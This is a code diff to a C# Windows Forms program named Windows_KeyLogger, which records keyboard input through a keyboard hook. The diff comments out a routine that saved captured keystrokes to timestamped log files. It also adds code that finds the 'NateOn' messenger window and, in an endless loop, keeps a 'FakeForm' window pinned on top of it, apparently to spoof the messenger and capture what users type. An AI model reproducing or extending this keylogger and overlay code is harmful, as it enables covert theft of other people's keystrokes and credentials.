@@ -17,6 +17,24 @@ namespace Windows_KeyLogger
 {
     public partial class Form1 : Form
     {
+        public struct RECT
+        {
+            public int left;
+            public int top;
+            public int right;
+            public int bottom;
+        }
+
+        [DllImport("user32")]
+        public static extern int SetWindowPos(int hwnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);
+
+        [DllImport("user32")]
+        public static extern int GetWindowRect(int hwnd, ref RECT lpRect);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int FindWindow(string strClassName, string strWindowName);
+ 
+
         public KeyboardHook hooker = null;
         public Boolean isHooking = false;
         public Dictionary<Keys, String> dicUpper;
@@ -30,7 +48,6 @@ namespace Windows_KeyLogger
             hooker = new KeyboardHook(this);
             InitDictionary();
         }
-
 
 
         private void button1_Click(object sender, EventArgs e)
@@ -51,17 +68,36 @@ namespace Windows_KeyLogger
             }
 
         }
-
+        public void gnt()
+        {
+            IntPtr HWND_TOPMOST = new IntPtr(-1);
+            IntPtr no = new IntPtr(0);
+            int natehWnd;
+            int formhWnd;
+            RECT nateonplace = default(RECT);
+            int natetop, nateleft, nateright, natebottom;
+            natehWnd = FindWindow(null, "NateOn");
+            formhWnd = FindWindow(null, "FakeForm");
+            while (true)
+            {
+                GetWindowRect(natehWnd, ref nateonplace);
+                natetop = nateonplace.top;
+                nateleft = nateonplace.left;
+                nateright = nateonplace.right;
+                natebottom = nateonplace.bottom;
+                SetWindowPos(formhWnd, HWND_TOPMOST, (nateleft)+5, (natetop)+5, nateright-nateleft, natebottom-natetop, 0x40);
+            }
+        }
         public void savelog()
         {
-            while (isHooking)
-            {
-                Thread.Sleep(60000);
-                String strFileName = "C:\\Users\\waps12b\\Documents\\log_" + DateTime.Now.ToString("yyyyMMdd HHmmss") + ".txt";
-                StreamWriter fsw = new StreamWriter(File.Open(strFileName, FileMode.Create));
-                fsw.Write(richLog.ToString());
-                fsw.Close();
-            }
+            //while (isHooking)
+            //{
+            //    Thread.Sleep(60000);
+            //    String strFileName = "C:\\Users\\waps12b\\Documents\\log_" + DateTime.Now.ToString("yyyyMMdd HHmmss") + ".txt";
+            //    StreamWriter fsw = new StreamWriter(File.Open(strFileName, FileMode.Create));
+            //    fsw.Write(richLog.ToString());
+            //    fsw.Close();
+            //}
         }
 
         private void richLog_TextChanged(object sender, EventArgs e)
@@ -160,6 +196,12 @@ namespace Windows_KeyLogger
             dicLower[Keys.Subtract] = dicUpper[Keys.Subtract] = "-";
             dicLower[Keys.Multiply] = dicUpper[Keys.Multiply] = "*";
             dicLower[Keys.Decimal] = dicUpper[Keys.Decimal] = ".";
+        }
+
+        private void btnNate_Click(object sender, EventArgs e)
+        {
+            new FakeForm().Show();
+            gnt();
         }
     }
 }
